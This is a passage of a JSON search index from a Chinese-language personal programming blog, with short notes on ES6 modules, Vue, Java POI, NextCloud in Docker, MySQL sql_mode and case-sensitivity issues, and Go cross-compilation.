Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"HTML載入 \u003cscript type=\"module\" src=\"a.js\"\u003e\u003c/script\u003e 現在Server都支援了ES6載入模組 當然要實驗看看 ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:3:0","tags":["ecmascript6"],"title":"ECMAScript6 Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"小小實驗 ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:4:0","tags":["ecmascript6"],"title":"ECMAScript6 Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"HFS踩坑記，無法載入 在公司用hfs不能開啟，但用xxamp可以直行 但是在家裡hfs又可以用了… ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:4:1","tags":["ecmascript6"],"title":"ECMAScript6 Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"兩個export物件會怎麼樣 這是我想的，好奇這樣能不能跑 export {xxxx,oooo} export {zzzz,yyyy} ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:4:2","tags":["ecmascript6"],"title":"ECMAScript6 Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"b.js export {a,b} export {c,d} // export {a,c,d} // SyntaxError: duplicate export name 'a' 詳細下載我寫的東西 題外話 export {b}; // 这是ES6的写法，实际上就是{b:b} 原本以為文章寫錯 剛好邊看直播[ Alex 宅幹嘛 ] 👨‍💻Vue 全家桶與 RESTful API 串接入門介紹 Part 2 - YouTube 有題到這個是ES6語法 XD ","date":"2018-09-22","objectID":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:4:3","tags":["ecmascript6"],"title":"ECMAScript6 Module使用筆記","uri":"/blog/posts/ECMAScript6-Module%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"最近使用Vue.js寫幾個範例 先做個備忘錄 筆記連結 了解完可以看下面的影片，可以更進一步了解vuejs 如物件、陣列、virtual DOM… 等等雷 [Vue.js 台灣 Meetup] Style Guide 導讀 / Kuro Hsu - YouTube EventBus的雷，刪除component記得做回收動作 [ Alex 宅幹嘛 ] 👨‍💻Vue EventBus 使用操作與外掛開發 - YouTube 還算滿好懂的過場教學 Vue.js (14) - 過場效果及動畫 | Tony Blog 備份圖 有講sync跟emit的差別，其實原理都一樣，但是sync是寫死的，不用多寫東西 【Vue】Vue中的父子组件通讯以及使用sync同步父子组件数据 - 外婆的彭湖湾 - 博客园 備份圖 live server跟json server的reload坑 (NOTE:liveServer.setttings.ignoreFiles) https://youtu.be/MCTETw0Slrw?t=1h21m51s vue cli electron remote | Electron 中文文档 nklayman/vue-cli-plugin-electron-builder: A Vue Cli 3 plugin for Electron with no required configuration remote | Electron ","date":"2018-09-19","objectID":"/blog/posts/Vue-js%E7%B0%A1%E6%98%93%E7%AD%86%E8%A8%98/:0:0","tags":["vue"],"title":"Vue.js簡易筆記","uri":"/blog/posts/Vue-js%E7%B0%A1%E6%98%93%E7%AD%86%E8%A8%98/"},{"categories":["寫程式一些事"],"content":"最近使用Java做報表，產生出來資料正確 但開啟會跳出奇怪的東西 後來是要開rar把一個資料刪除sample檔就順利 簡單紀錄 程式報表處理是這樣的 讀取Excel SAMPLE檔案 寫入Excel資料 另存新檔到xxxx.xlsx 今天就是改Excel SAMPLE檔案存檔 程式順利執行執行 但是跳出錯誤訊息 ![錯誤訊息1\"](./1.jpg “Excel) ![錯誤訊息2”](./2.jpg “Excel) 雖然會自動修復…，但每次產生新報表這樣也很麻煩 用rar開啟sample.xlsx檔案刪除calcChain.xml 後來副理跟我說要故這個才能解決。 不知道是什麼原因才造成的 先筆記 ","date":"2018-09-18","objectID":"/blog/posts/Java%E6%93%8D%E4%BD%9CPOI%E4%BF%AE%E6%94%B9%E5%A0%B1%E8%A1%A8sample%E6%AA%94%E7%99%BC%E7%94%9F%E4%BF%A1%E4%BB%BB%E6%B4%BB%E9%A0%81%E7%B0%BF%E5%95%8F%E9%A1%8C/:0:0","tags":["POI","java"],"title":"Java操作POI修改報表sample檔發生信任活頁簿問題","uri":"/blog/posts/Java%E6%93%8D%E4%BD%9CPOI%E4%BF%AE%E6%94%B9%E5%A0%B1%E8%A1%A8sample%E6%AA%94%E7%99%BC%E7%94%9F%E4%BF%A1%E4%BB%BB%E6%B4%BB%E9%A0%81%E7%B0%BF%E5%95%8F%E9%A1%8C/"},{"categories":["Docker"],"content":"NextCloud 使用docker簡易安裝筆記 docker run -d -p 8000:80 nextcloud 就可以簡單使用NextCloud docker run -d -v /mnt/HD1/nextcloud_bk:/var/www/html -p 8000:80 nextcloud 當然要備份資料可以掛載，我有試著掛載~/data/owncolud.db好像沒有作用 在想應該還有其他設定檔 它還有很特別功能，竟然有檔案版本控制 我沒玩過NAS，不知道是不是這是NAS基本功能 {% asset_img 01.png %} 家裡有一台Raspberry PI，它被用來當動物機，常常追番用的 平常傳資料我都是在window開hfs去傳的，有時候覺得跑來跑去很麻煩 還在想它可以怎麼跟Raspbery PI用 ","date":"2018-09-16","objectID":"/blog/posts/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:0:0","tags":["docker","nas","nextcloud"],"title":"NextCloud 使用docker簡易安裝筆記","uri":"/blog/posts/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Docker"],"content":"elementary OS client設定 sudo add-apt-repository ppa:nextcloud-devs/client sudo apt-get update 這樣就能安裝 nextcloud-client sudo apt-get install nextcloud-client 可惜…，當天講者電腦icon有同步圖示，elementary OS好像看不到QQ 後來安裝nautilus跟nautilus-nextcloud，然後登入再登入之後就能看到nautilus有圖示功能了 sudo apt-get install nautilus nautilus-nextcloud 原生elementary os 檔案管理工具沒有套件…. 找個播放器來試試 ","date":"2018-09-16","objectID":"/blog/posts/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:1:0","tags":["docker","nas","nextcloud"],"title":"NextCloud 使用docker簡易安裝筆記","uri":"/blog/posts/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Docker"],"content":"安裝audio player 可用上面搜尋快速找到你要的套件 別對搜尋中按鈕騙了…，害我等了快30分鐘…(我還以為壞掉了) 請記得要點「搜尋中」他才會真的搜尋!!! 後來還發現還有markdown套件!!! 假如區網可能會遇到非安全網域的問題 假如你有root權限，直接做volumes資料夾那邊設定 沒的話要docker exec -ti xxxx bash進去改 我沒看文件，加入 1 =\u003e '*', 竟然能跑XD 有對外開放IP，不建議這樣設定 指定比較安全 參考來源: 講者簡報 講者blog Promethues Ubuntu 安裝教學 ","date":"2018-09-16","objectID":"/blog/posts/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:2:0","tags":["docker","nas","nextcloud"],"title":"NextCloud 使用docker簡易安裝筆記","uri":"/blog/posts/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["Docker"],"content":"意外升級搞壞(2021-01-10) 今天用Nextcloud Security Scan掃我 nextcloud 弱點 發現版本稍微舊 ownyourbits/nextcloudpi - Docker Hub 想說 docker pull ownyourbits/nextcloudpi 這樣更新 重啟新的 container 就可以了 誰知道 MariaDB 不能用了 不知道是不是之前版本是 MySQL 關係 於是我只能重啟重建之路 先假設我有使用 traefik 所以我的 80 443 port 都被占用 這次我採取使用 docker-compose 來做 ** 以下我用1.34.1 操作還是有問題** 有看到有人降到 1.31 就能正常使用 好像後面有大改版，畫面首頁有調整 1.34.1 Docker volume does not contain user data - ℹ️ Support / 📦 Appliances (Docker, Snappy, VM, NCP) - Nextcloud community 重點好像有bug，docker hub 好像沒這個版本 所以去 Git 上面抓下來編譯 sudo apt update sudo apt install jq git clone https://github.com/nextcloud/nextcloudpi.git # 預設就是 1.34.1 git checkout v1.31 cd nextcloudpi ./build-docker.sh armhf nextcloudpi/docker-compose-armhf.yml at master · nextcloud/nextcloudpi · GitHub version: \"3\" services: nextcloudpi: # image: ownyourbits/nextcloudpi # 後來發現 nextcloudpi 有 nextcloudpi-armhf image image: ownyourbits/nextcloudpi-armhf command: \"192.168.1.x\" networks: - traefik_network labels: - \"traefik.backend=ncp\" - \"traefik.http.routers.ncp.rule=Host(`xxxx.duckdns.org`)\" - \"traefik.http.routers.ncp.tls=true\" - \"traefik.http.services.ncp.loadbalancer.server.port=80\" restart: always ports: - \"1180:80\" # 暫時使用，traefik 可以註解調 - \"11443:443\" # 暫時使用，traefik 可以註解調 - \"4443:4443\" volumes: - /media/USBdrive/ncp2:/data - /etc/localtime:/etc/localtime:ro networks: traefik_network: external: true 因為我用 Traefik 轉 https 關係 所以我要把 Force HTTPS 給關掉 nc-trust-domain 把 192.168.1.202 加進去 https://192.168.1.202:11443 就能用 ncp 進去 我通常會建立新的 admin 帳號給自己 要把舊的檔案一進去 docker-compose exec nextcloudpi bash cd /data/nextcloud/ sudo -u www-data php occ files:scan --all 新版檔案路徑在 /data-ro/nextcloud/data/xxuser/files 1.43.1 bug?? 上傳大量檔案推薦使用 WinSCP 上傳 可以參考:Harry 程式筆記: [WinSCP] sftp下使用sudo上傳檔案 怎麼使用 winscp? 可以參考我這篇 WinSCP 用 sudo 上傳檔案的方法(含切換一般使用者) | 程式狂想筆記 https://192.168.1.x:4443/?app=nc-scan-auto 可以馬上執行 通常60分會讀一次 暫時收工 2021-05-10 還是不想透過用指令方法去實作 traefik 上傳多個 MP3 會有問題(可能樹莓派做這些動作 loading 還是太重了) 想透過 sftp 上傳 權限用 www-data 本來想掛個sftp 但我又不想用www-data為帳號 `` git clone cd sftp docker build . -t rpi-sftp docker run -p 2223:22 -d rpi-sftp miles:123456:33:33:upload -v [[Docker] 使用 Docker 建置 FTP(SFTP) 環境 - Miles's Journey](https://mileslin.github.io/2020/02/%E4%BD%BF%E7%94%A8-Docker-%E5%BB%BA%E7%BD%AE-FTP-SFTP-%E7%92%B0%E5%A2%83/) [Nextcloud](https://hrbhot.github.io/posts/nextcloud/) [nextcloud ntfs权限问题及解决方法-β1ùe](https://b1ue.me/archives/183) [Docker安装nextcloud以及遇到的一下问题和优化方法 - 烦fpy](https://www.fanfpy.top/index.php/archives/68/) [阿就操場啊~: 使用者在Linux, BSD切換群組](https://2formosa.blogspot.com/2020/10/change-group-on-UNIX-like-system.html) 我後來使用 `usermod -a -G www-data pi` 這樣我就可以執接sftp放檔案進去 www-data也能刪檔案 [linuxserver/nextcloud - LinuxServer.io](https://docs.linuxserver.io/images/docker-nextcloud) 改umask ~~`-e UMASK=022`~~ 沒效...，看來新建資料夾比較麻煩 [How to change Default Umask Permission in Linux](https://www.computernetworkingnotes.com/rhce-study-guide/how-to-change-default-umask-permission-in-linux.html) ","date":"2018-09-16","objectID":"/blog/posts/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/:3:0","tags":["docker","nas","nextcloud"],"title":"NextCloud 使用docker簡易安裝筆記","uri":"/blog/posts/NextCloud-%E4%BD%BF%E7%94%A8docker%E7%B0%A1%E6%98%93%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98/"},{"categories":["SQL"],"content":"最近遇到一些MySQL地雷，要好好好整理一下 正常DB已經設定非嚴格模式 今天遇到Java執行遇到Warning不會過 SQL執行如insert xxxx ….. select xxx …. 語法也沒有錯 phpmyadmin可以執行 java執行就是過不了 2018-09-05 09:45:10,428 ERROR {Thread-0} [xxxxx.rbt.client.lib.Function] : insertMusicBoxReportLog com.mysql.jdbc.MysqlDataTruncation: Data truncation: Truncated incorrect DOUBLE value: '785+712' 這就非常讓我疑惑 首先，先研究這個錯誤問題 https://com-it.tech/archives/170855 才過一天…，網站就掛掉了 google cache備份 剛剛注意到下面有原網址小心MySQL的隐式类型转换陷阱 | Sean’s Notes select '1aa1'=='1' 就會出現這個問題 好像自動轉型會發生狀況 產生Warning JDBC不管怎麼樣，預設會自動開啟嚴格模式 spring.datasource.url=jdbc:mysql://localhost:3306/conweb?sessionVariables=sql_mode=‘NO_ENGINE_SUBSTITUTION’\u0026jdbcCompliantTruncation=false 爬到stackoverflow找到這篇java - com.mysql.jdbc.MysqlDataTruncation: Data truncation: Data too long for column ‘column_name’ - Stack Overflow 看到可以設定sql_mode就有不好的預感 根据“三、重要的SQL_MODE值”，因而可以获知，使用JDBC Driver作为Mysql Client，碰到\"inserting an incorrect value into a column\"的情况的时候，会抛出ERROR，而不是WARNING JDBC Driver默认会设置会话SQL_MODE=‘STRICT_TRANS_TABLES’的原因是：“enforce JDBC compliance on truncation checks\"需要开启\"STRICT_TRANS_TABLES\"这个SQL_MODE，而在JDBC URL中存在着\"jdbcCompliantTruncation\"这个参数，该参数可以控制是否开启\"enforce JDBC compliance on truncation checks\"功能，当我们通过JDBC URL设定\"jdbcCompliantTruncation=false\"之后，也就不会去默认设置SQL_MODE=‘STRICT_TRANS_TABLES’了 最後找到這個確認Mysql的SQL_MODE - CSDN博客 原本不想動測試DB資料，後來還是手動把785+712資料拿掉就正常執行了 2019-11-25 建立 table 時後 column 欄位建議要 NULL 最近踩了一個雷，因為公司內部有兩個DB 做同步，一個用嚴格模式、一個不是 導致另一個嚴格模式資料沒有進來 sql_mode 用 Dbeaver 查詢結果跟 phpmyadmin 不一樣??? 後來發現跟上次跟 Java 一樣採到一樣的雷 有些 client 會自動幫你設定 sql_mode 要使用 SHOW GLOBAL VARIABLES LIKE 'sql_mode'; 會比較準 SELECT @@sql_mode; -- STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION for dbeaver -- NO_ENGINE_SUBSTITUTION for phpmyadmin SHOW GLOBAL VARIABLES LIKE 'sql_mode'; -- NO_ENGINE_SUBSTITUTION 非嚴警模式下，Level Warning 層級不會跳錯誤 在非嚴警模式下可以 SHOW WARNINGS 看到資料 MySQL :: MySQL 5.7 Reference Manual :: 5.1.10 Server SQL Modes Strict SQL Mode Strict mode controls how MySQL handles invalid or missing values in data-change statements such as INSERT or UPDATE. A value can be invalid for several reasons. For example, it might have the wrong data type for the column, or it might be out of range. A value is missing when a new row to be inserted does not contain a value for a non-NULL column that has no explicit DEFAULT clause in its definition. (For a NULL column, NULL is inserted if the value is missing.) Strict mode also affects DDL statements such as CREATE TABLE. 裡面都寫得很清楚 MySQL :: MySQL 5.7 Reference Manual :: 13.1.18 CREATE TABLE Statement MySQL :: MySQL 5.7 Reference Manual :: 13.2.5 INSERT Statement 可以搜尋 strict 關鍵字找 改table 欄位大寫也跟 sql_mode有關係 MySQL alter table modify column failing at rows with null values - Stack Overflow MySQL刪除重複資料 @ Nightmare的胡言亂語 :: 痞客邦 :: 參考來源 MySQL 中数据类型的默认值 - default 约束 - MySQL 拾遗 - 简单教程，简单编程 MySQL sql_mode 说明（及处理一起 sql_mode 引发的问题） - Sean’s Notes - SegmentFault 思否 被 MySQL sql_mode 深深伤害（ 上 ） - MySQL 拾遗 - 简单教程，简单编程 被 MySQL sql_mode 深深伤害（ 中 ） - MySQL 拾遗 - 简单教程，简单编程 被 MySQL sql_mode 深深伤害（ 下 ） - MySQL 拾遗 - 简单教程，简单编程 彩蛋 Data View and Format · dbeaver/dbeaver Wiki · GitHub Data migration · dbeaver/dbeaver Wiki · GitHub ","date":"2018-09-10","objectID":"/blog/posts/Truncated-incorrect-DOUBLE-value-785-712-%E5%92%8C-Java-JDBC%E9%A0%90%E8%A8%ADsql-mode%E7%82%BA%E5%9A%B4%E6%A0%BC%E6%A8%A1%E5%BC%8F/:0:0","tags":["sql"],"title":"Truncated incorrect DOUBLE value: '785+712' 和 Java JDBC預設sql_mode為嚴格模式","uri":"/blog/posts/Truncated-incorrect-DOUBLE-value-785-712-%E5%92%8C-Java-JDBC%E9%A0%90%E8%A8%ADsql-mode%E7%82%BA%E5%9A%B4%E6%A0%BC%E6%A8%A1%E5%BC%8F/"},{"categories":["MySQL"],"content":"最近公司報表出問題了 繼上次DB還原MySQL在Linux下預設有分大小寫和Incorrect integer value: ’’ for column ’num’ 問題 | 程式狂想筆記，有些設定跑掉 這次出現這個Data truncated for column 'd' at row 因為重新設定還原sql_mode是嚴格模式… 為什麼這次會出現Incorrect integer value: '' for column 'num' 不知道這次也是Excel匯入也出現Data truncated for column 'd' at row 為什麼有不一樣的結果呢?? 發現帶入空字串輸入到double會發這種事情… 導致可能前人寫的Excel匯入會有狀況 有簡單用docker hub pwd(play with docker)測試 簡單記錄測試紀錄 再開嚴格模式 '1'都可以正常存入，但前後多不明空白會不能寫入 但沒開嚴格模式時候 ' 1'不能正常寫入 '1 '可以正常寫入 當然他也沒有很聰明''跟'NULL'會變NULL 可能要改sql_mode改成沒嚴格模式 不過嚴格模式，主管擔心要重啟MySQL 所以也不能隨意重啟orz 最後網路上有爬到XYZ的筆記本: MySQL Server 的 SQL Modes SQL Modes 預設值： 在 5.6.5 和之前的版本，預設值是空的，沒有設置。 在 5.6.6 和之前的版本，預設值是 NO_ENGINE_SUBSTITUTION。 查詢目前 SQL Modes 目前的設定： SELECT @@GLOBAL.sql_mode; SELECT @@SESSION.sql_mode; GLOBAL.sql_mode 是目前伺服器的設定值，SESSION.sql_mode 是目前連線的設定值 設定 SQL Modes 方法有以下三種： 1.修改設定檔(my.cnf或my.ini)中的 sql-mode=“設定值” 2.MySQL啟動時，加參數 –sql-mode=“設定值” 3.連線登入後修改 SET GLOBAL sql_mode=‘設定值’; SET SESSION sql_mode=‘設定值’; GLOBAL 是修改目前伺服器的設定值，SESSION 是修改目前連線的設定值 看到下面的3.連線登入修改，就謝天謝地 當然也要注意重新啟動，記得要改my.cnf # /etc/mysql/my.cnf [mysqld] sql_mode = NO_ENGINE_SUBSTITUTION 不用這個方法改code不知改道何時才會改完… 最後新專案開發用到MySQL還是啟用 比較不會出問題 [mysqld] sql_mode='ONLY_FULL_GROUP_BY,NO_AUTO_VALUE_ON_ZERO,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE, ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,PIPES_AS_CONCAT,ANSI_QUOTES' 參照來源:mysql的sql_mode合理设置 感覺比較不會出甚麼嚴重問題 ","date":"2018-09-01","objectID":"/blog/posts/%E9%81%87%E5%88%B0Data-truncated-for-column-d-at-row-%E5%92%8C%E6%94%B9sql-mode%E9%82%A3%E4%BA%9B%E4%BA%8B/:0:0","tags":["sql","mysql"],"title":"遇到Data truncated for column 'd' at row 和改sql_mode那些事","uri":"/blog/posts/%E9%81%87%E5%88%B0Data-truncated-for-column-d-at-row-%E5%92%8C%E6%94%B9sql-mode%E9%82%A3%E4%BA%9B%E4%BA%8B/"},{"categories":["GO"],"content":"最近玩golang最喜歡它編譯可以直接跨平台執行 而且看了一下 真的很簡單，只需要一行go build 但真的是這樣的嗎? (不然也不會有這一篇了XD) golang編譯真的很簡單 只需要go build main.go即可以編譯main.go 但是go build是整個目錄都會進行編譯 編譯出來的程式正常本機可以執行 為什麼要框住本機呢 因為這就是我踩雷的地方 Mac 下编译 Linux 和 Windows 64位可执行程序 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go Linux 下编译 Mac 和 Windows 64位可执行程序 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build main.go CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go Windows 下编译 Mac 和 Linux 64位可执行程序 SET CGO_ENABLED=0 SET GOOS=darwin SET GOARCH=amd64 go build main.go SET CGO_ENABLED=0 SET GOOS=linux SET GOARCH=amd64 go build main.go 參考來源:Golang 在 Mac、Linux、Windows 下如何交叉编译 - CSDN博客 假如你是在window用git-bash話，前面變數可以加export 當然後面的main.go可以不用填 正常有go get套件編譯會沒有問題 環境變數設定完，可以go env查看GO環境變數設定值 但重點來了 ","date":"2018-09-01","objectID":"/blog/posts/GO%E7%B7%A8%E8%AD%AF%E7%A8%8B%E5%BC%8F%E7%B4%80%E9%8C%84/:0:0","tags":["GO"],"title":"GO編譯程式紀錄","uri":"/blog/posts/GO%E7%B7%A8%E8%AD%AF%E7%A8%8B%E5%BC%8F%E7%B4%80%E9%8C%84/"},{"categories":["GO"],"content":"編譯後別台電腦不能執行 奇怪我把程式丟到Linux竟然不能執行 (說好的編譯可以跑的 囧) 但發現執行錯誤訊息 竟然有出現我在Win7路徑 當下沒有留意到是抓不到Package問題 好像有甚麼address關鍵字錯誤 因為同事也有在玩 他說是抓不到套件關係 後來有爬到一個指令 在程式目錄執行 go build -a -v 這樣就很神奇可以跑 不過我在win7編譯Linux程式，在Linux還是不能跑 Linux編譯Win7程式，在Win7正常執行 但是在Win10編譯Linux程式，在Linux正持行 反之也可以 不知道Win7編譯GO怎麼了…. 其實這篇重點只有go build -v -a 但網路上看到的文章真的不多 不知道為什麼…(有可能我方法不正確) ","date":"2018-09-01","objectID":"/blog/posts/GO%E7%B7%A8%E8%AD%AF%E7%A8%8B%E5%BC%8F%E7%B4%80%E9%8C%84/:1:0","tags":["GO"],"title":"GO編譯程式紀錄","uri":"/blog/posts/GO%E7%B7%A8%E8%AD%AF%E7%A8%8B%E5%BC%8F%E7%B4%80%E9%8C%84/"},{"categories":["GO"],"content":"gitea編譯紀錄 中間有試著gitea編譯 make generate all 不知道這一行我不能執行 但輸入make就正常運行 輸入go build -v -a也能跑，(go build好像不能) 參考來源 golang - Go语言的三个命令 go build, go install, go get - SegmentFault 思否 go build - GO 命令教程 - 极客学院Wiki ","date":"2018-09-01","objectID":"/blog/posts/GO%E7%B7%A8%E8%AD%AF%E7%A8%8B%E5%BC%8F%E7%B4%80%E9%8C%84/:2:0","tags":["GO"],"title":"GO編譯程式紀錄","uri":"/blog/posts/GO%E7%B7%A8%E8%AD%AF%E7%A8%8B%E5%BC%8F%E7%B4%80%E9%8C%84/"},{"categories":["寫程式一些事"],"content":"其實對MySQL管理那一塊真的不是很熟 但最近踩到一堆雷 還是記一下 Linux跟Windows運行MySQL會不一樣的雷 哪天說不定還會踩到orz ","date":"2018-08-28","objectID":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/:0:0","tags":["MySQL"],"title":"MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題","uri":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/"},{"categories":["寫程式一些事"],"content":"MySQL在Linux下預設有分大小寫 之前在玩Docker發現MySQL底下，Linux有分大小寫 奇怪，為什麼我大學在Windows下就沒事 當初在轉docker時候遇到這個問題 當下就只記window大小寫沒分，Linux有分大小寫 但沒有理解為什麼 不過，今天有爬到MySQL表名大小写敏感导致的问题 - CSDN博客 原來用window同一個目錄不能存在test.txt和Test.txt這兩個檔案(我用window20多年都不知道有這個問題 囧) ","date":"2018-08-28","objectID":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/:1:0","tags":["MySQL"],"title":"MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題","uri":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/"},{"categories":["寫程式一些事"],"content":"查看是否有用大小寫變數 show variables like '%lower_case_table_names%'; ","date":"2018-08-28","objectID":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/:1:1","tags":["MySQL"],"title":"MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題","uri":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/"},{"categories":["寫程式一些事"],"content":"修改大小寫方法 修改变量lower-case-table-names 为什么会出现这个问题，主要是因为开发和测试环境不一致导致的，这也是有时测试环境完全没问题，一到生产就出诡异问题的原因之一。所以，我们除了让测试同事认真测试外，最好本地和测试环境还是一致。 对当前这个问题，我们直接修改SQL中的Emp为emp即可解决问题，但是为了根本解决问题，我们还须修改mysql的环境变量，也就是将lower_case_table_names的值改为0. 修改方法： 找到mysql的安装位置 找到主目录下的my.ini配置文件 在[mysqld]节点下添加lower-case-table-names=0 重启mysql服务 來源MySQL表名大小写敏感导致的问题 - CSDN博客 ","date":"2018-08-28","objectID":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/:1:2","tags":["MySQL"],"title":"MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題","uri":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/"},{"categories":["寫程式一些事"],"content":"Incorrect integer value: ’’ for column ‘id’ 最近事情這樣的，公司有程式做報表匯入動作Incorrect integer value: '' for column 'id' 經過查詢SQL語法發現，目前程式匯入某欄位剛好抓到price為空 導致SQL會有問題 當下我以為應該不能跑 不過在我開發環境(window)竟然可以跑 INSERT INTO `test`(test ,num) values ( 'fff',''); 注意num為int 開發環境竟然可以跑!!!!! 更奇葩的是fff也能過 後來有找到解决Incorrect integer value: ’’ for column ‘id’ at row 1的方法 - CSDN博客 是sql_mode有開啟STRICT_TRANS_TABLES my.ini中查找sql-mode，默认为sql-mode=“STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”， 将其修改为sql-mode=“NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”，重启mysql后即可 參考來源: 解决Incorrect integer value: ’’ for column ‘id’ at row 1的方法 - CSDN博客 STRICT_TRANS_TABLES(存储引擎启用严格模式，非法数据值被拒绝)。 - Jesson - ITeye博客 ","date":"2018-08-28","objectID":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/:2:0","tags":["MySQL"],"title":"MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題","uri":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/"},{"categories":["寫程式一些事"],"content":"結論 用MySQL開發還是用Docker開發，不然MySQL在Window和Linux兩個環境真的差好多 囧 不然事後上線真的很慘，至於公司為什麼以前可以跑 好像上禮拜DB掛掉重裝，那台MySQL裡面sql_mode變數有設定STRICT_TRANS_TABLES 所以導致以前可以跑，但現在不能 沒事還是不要用Windows 囧 select @@sql_mode -- window底下(xxamp) -- NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION -- 公司底下(別台設定) -- NO_ENGINE_SUBSTITUTION -- docker 啟動mysql(不知道為什麼設定一大堆......) -- 